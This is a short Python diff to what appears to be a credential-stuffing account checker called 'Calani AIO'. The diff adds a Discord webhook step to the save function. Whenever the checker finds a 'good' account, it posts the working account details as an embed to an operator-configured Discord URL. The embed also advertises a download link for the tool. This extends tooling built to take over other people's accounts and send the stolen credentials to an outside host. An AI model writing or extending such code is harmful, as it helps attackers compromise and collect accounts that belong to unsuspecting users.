@@ -108,7 +108,8 @@ def get_time():
     """
     return datetime.now().strftime("%Y-%m-%d %H-%M-%S")
 
-def save(name:str,saveType:str,time:str,content:str):
+def save(name:str,saveType:str,time:str,content:str,use_webhook=True):
+    from discord_webhook import DiscordWebhook, DiscordEmbed
     """
     Saves the given account to a file
     save(
@@ -126,6 +127,13 @@ def save(name:str,saveType:str,time:str,content:str):
                 with open(f"Results/{time}/{name}_custom.txt","a",errors="ignore") as file: file.write(content+"\n")
             case "good":
                 with open(f"Results/{time}/{name}_good.txt","a",errors="ignore") as file: file.write(content+"\n")
+                if 'https://discord.com/api/webhooks/' in Checker.discord_webhook and use_webhook:
+                    webhook = DiscordWebhook(url=Checker.discord_webhook,username="Account Hit",avatar_url="https://i.imgur.com/KCmdXsT.png",rate_limit_retry=True)
+                    embed = DiscordEmbed(title=f"{name.title()} Account Hit", colour='2a7fb7', description=f"```{content}```")
+                    embed.set_author(name="Calani AIO", url="https://calani.mickey-ye.lol", icon_url="https://i.imgur.com/KCmdXsT.png")
+                    embed.set_footer(text="Download: https://calani.mickey-ye.lol")
+                    webhook.add_embed(embed)
+                    webhook.execute()
             case _:
                 with open(f"Results/{time}/{name}.txt","a",errors="ignore") as file: file.write(content+"\n")
 
